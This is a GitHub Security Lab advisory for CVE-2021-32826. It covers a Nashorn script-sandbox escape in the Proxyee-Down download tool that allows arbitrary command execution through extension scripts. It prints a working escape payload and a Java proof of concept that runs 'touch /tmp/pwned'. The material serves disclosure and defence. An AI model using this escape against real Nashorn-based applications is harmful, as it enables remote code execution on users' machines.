<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 21, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-053: Remote code execution in Proxyee-Down - CVE-2021-32826</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-03-26: Issue reported to liwei-8466@qq.com</li>
  <li>2021-07-05: Deadline expired.</li>
  <li>2021-07-05: Publication as per our disclosure policy.</li>
</ul>

<h2 id="summary">Summary</h2>
<p>An attacker being able to provide an extension script (eg: through a MiTM attack or by hosting a malicious extension) may be able to run arbitrary commands on the system running Proxyee-Down.</p>

<h2 id="product">Product</h2>
<p>Proxyee-Down</p>

<h2 id="tested-version">Tested Version</h2>
<p>Version 3.4
Latest commit at the date of reporting: ec921c3 on 11 Aug 2020</p>

<h2 id="details">Details</h2>

<h3 id="insufficient-script-engine-sandboxing-ghsl-2021-053">Insufficient Script Engine sandboxing (GHSL-2021-053)</h3>

<p>Proxyee-Down uses <a href="https://github.com/proxyee-down-org/proxyee-down/blob/ec921c3c2ca6e205484ec52ab8a8649c8f882e5c/main/src/main/java/org/pdown/gui/extension/jsruntime/JavascriptEngine.java#L17-L38">Nashorn engine</a> to evaluate <a href="https://github.com/proxyee-down-org/proxyee-down/blob/ec921c3c2ca6e205484ec52ab8a8649c8f882e5c/main/src/main/java/org/pdown/gui/extension/util/ExtensionUtil.java#L173">1</a>,<a href="https://github.com/proxyee-down-org/proxyee-down/blob/ec921c3c2ca6e205484ec52ab8a8649c8f882e5c/main/src/main/java/org/pdown/gui/extension/util/ExtensionUtil.java#L176">2</a> Javascript code provided by extensions:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">public</span> <span class="kd">static</span> <span class="nc">ScriptEngine</span> <span class="nf">buildEngine</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">ScriptException</span><span class="o">,</span> <span class="nc">NoSuchMethodException</span> <span class="o">{</span>
    <span class="nc">NashornScriptEngineFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NashornScriptEngineFactory</span><span class="o">();</span>
    <span class="nc">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">getScriptEngine</span><span class="o">(</span><span class="k">new</span> <span class="nc">SafeClassFilter</span><span class="o">());</span>
    <span class="nc">Window</span> <span class="n">window</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Window</span><span class="o">();</span>
    <span class="nc">Object</span> <span class="n">global</span> <span class="o">=</span> <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"this"</span><span class="o">);</span>
    <span class="nc">Object</span> <span class="n">jsObject</span> <span class="o">=</span> <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"Object"</span><span class="o">);</span>
    <span class="nc">Invocable</span> <span class="n">invocable</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Invocable</span><span class="o">)</span> <span class="n">engine</span><span class="o">;</span>
    <span class="n">invocable</span><span class="o">.</span><span class="na">invokeMethod</span><span class="o">(</span><span class="n">jsObject</span><span class="o">,</span> <span class="s">"bindProperties"</span><span class="o">,</span> <span class="n">global</span><span class="o">,</span> <span class="n">window</span><span class="o">);</span>
    <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"var window = this"</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">engine</span><span class="o">;</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>The engine is configured to use a <code class="language-plaintext highlighter-rouge">ClassFilter</code> in order to <code class="language-plaintext highlighter-rouge">Prohibit any explicit call to java code</code> (<code class="language-plaintext highlighter-rouge">禁止任何显式调用java代码</code>):</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cm">/**
   * 禁止任何显式调用java代码
   */</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SafeClassFilter</span> <span class="kd">implements</span> <span class="nc">ClassFilter</span> <span class="o">{</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">exposeToScripts</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>The filter above does not expose any Java classes to the Javascript scripts, but the <code class="language-plaintext highlighter-rouge">ClassFilter</code> on its own is not sufficient to prevent code execution since Nashorn exposes the underlying engine to the script and it is still possible to execute arbitrary code with it. For example, the script below will start a system process:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="p">.</span><span class="nx">engine</span><span class="p">.</span><span class="nx">factory</span><span class="p">.</span><span class="nx">scriptEngine</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">java.lang.Runtime.getRuntime().exec(</span><span class="se">\</span><span class="s1">"touch /tmp/pwned</span><span class="se">\</span><span class="s1">")</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">Remote Code Execution</code>.</p>

<h4 id="references">References</h4>
<ul>
  <li><a href="https://mbechler.github.io/2019/03/02/Beware-the-Nashorn/">Beware of the Nashorn</a></li>
</ul>

<h4 id="poc">PoC</h4>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">jdk.nashorn.api.scripting.ClassFilter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">jdk.nashorn.api.scripting.NashornScriptEngineFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SafeClassFilter</span> <span class="kd">implements</span> <span class="nc">ClassFilter</span> <span class="o">{</span>
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">exposeToScripts</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">NashornScriptEngineFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NashornScriptEngineFactory</span><span class="o">();</span>
            <span class="nc">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">getScriptEngine</span><span class="o">(</span><span class="k">new</span> <span class="nc">SafeClassFilter</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned\")')"</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32826</li>
</ul>

<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-053</code> in any commu